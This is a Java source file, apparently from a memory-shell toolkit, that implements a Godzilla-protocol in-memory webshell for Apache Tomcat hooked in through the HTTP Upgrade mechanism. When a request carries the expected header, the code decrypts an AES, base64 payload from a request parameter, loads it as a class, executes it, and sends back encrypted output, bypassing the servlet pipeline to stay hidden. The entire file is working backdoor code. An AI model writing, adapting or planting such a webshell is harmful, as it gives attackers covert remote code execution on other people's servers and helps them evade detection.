package com.reajason.javaweb.memshell.shelltool.godzilla;

import org.apache.catalina.connector.Response;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.Request;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;

/**
 * 哥斯拉协议的 Tomcat Upgrade 内存马：请求带 {@code Connection: Upgrade} 与
 * {@code Upgrade: <shellClassName>} 时，由连接器的 {@code httpUpgradeProtocols}
 * 直接回调 {@link #accept(Request)}，不经过 servlet 管道。
 *
 * @author ReaJason
 */
public class GodzillaUpgrade extends ClassLoader implements UpgradeProtocol {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    public GodzillaUpgrade() {
    }

    public GodzillaUpgrade(ClassLoader z) {
        super(z);
    }

    @Override
    public boolean accept(Request req) {
        org.apache.catalina.connector.Request request;
        Response response;
        try {
            request = getRequest(req);
            response = request.getResponse();
        } catch (Throwable e) {
            e.printStackTrace();
            return false;
        }
        if (response == null) {
            return false;
        }
        try {
            if (request.getHeader(headerName) == null || !request.getHeader(headerName).contains(headerValue)) {
                return false;
            }
            PrintWriter writer = response.getWriter();
            try {
                byte[] data = base64Decode(request.getParameter(pass));
                data = this.x(data, false);
                if (payload == null) {
                    payload = new GodzillaUpgrade(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    writer.write(md5.substring(0, 16));
                    writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    writer.write(md5.substring(16));
                }
            } catch (Throwable e) {
                e.printStackTrace();
                writer.write(getErrorMessage(e));
            }
            writer.flush();
            writer.close();
            return true;
        } catch (Throwable e) {
            e.printStackTrace();
            return true;
        }
    }

    /**
     * Upgrade 回调发生在 {@code CoyoteAdapter.service} 之前：连接器 Request/Response 只有等
     * adapter 跑过一次才会绑定到 note 1。processor 复用时 note 还在，可以直接取；全新 processor
     * （冷启动后的第一条连接）必须照 CoyoteAdapter 的方式补建一对，否则拿不到可写的响应。
     */
    @SuppressWarnings("all")
    private org.apache.catalina.connector.Request getRequest(Request req) throws Exception {
        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
        if (request != null) {
            return request;
        }
        // Tomcat 8.5 起 coyote Request 的 hook 只有私有字段，没有 getHook()
        Object hook = getFieldValue(req, "hook");
        Object adapter = getFieldValue(hook, "adapter");
        Object connector = getFieldValue(adapter, "connector");
        Object coyoteResponse = req.getClass().getMethod("getResponse").invoke(req);

        Response response;
        try {
            // Tomcat 8.5 ~ 10.1：先构造再绑定 coyote 对象
            request = (org.apache.catalina.connector.Request) connector.getClass().getMethod("createRequest").invoke(connector);
            request.getClass().getMethod("setCoyoteRequest", Request.class).invoke(request, req);
            response = (Response) connector.getClass().getMethod("createResponse").invoke(connector);
            response.getClass()
                    .getMethod("setCoyoteResponse", Class.forName("org.apache.coyote.Response"))
                    .invoke(response, coyoteResponse);
        } catch (NoSuchMethodException e) {
            // Tomcat 11 起改为带参构造，connector 不再单独绑定 coyote 对象
            request = (org.apache.catalina.connector.Request) connector.getClass()
                    .getMethod("createRequest", Request.class).invoke(connector, req);
            response = (Response) connector.getClass()
                    .getMethod("createResponse", Class.forName("org.apache.coyote.Response")).invoke(connector, coyoteResponse);
        }
        request.getClass().getMethod("setResponse", response.getClass()).invoke(request, response);
        response.getClass().getMethod("setRequest", request.getClass()).invoke(response, request);
        // Tomcat 8.5 ~ 10.1 只在首次绑定 note 时设置查询串字符集；漏掉会让放行的普通请求按默认编码解析
        Object parameters = req.getClass().getMethod("getParameters").invoke(req);
        Object uriCharset = connector.getClass().getMethod("getURICharset").invoke(connector);
        parameters.getClass()
                .getMethod("setQueryStringCharset", Class.forName("java.nio.charset.Charset"))
                .invoke(parameters, uriCharset);

        req.setNote(1, request);
        coyoteResponse.getClass().getMethod("setNote", int.class, Object.class).invoke(coyoteResponse, 1, response);
        return request;
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

    @Override
    public String getHttpUpgradeName(boolean isSSLEnabled) {
        return "";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return "";
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
        return null;
    }
}
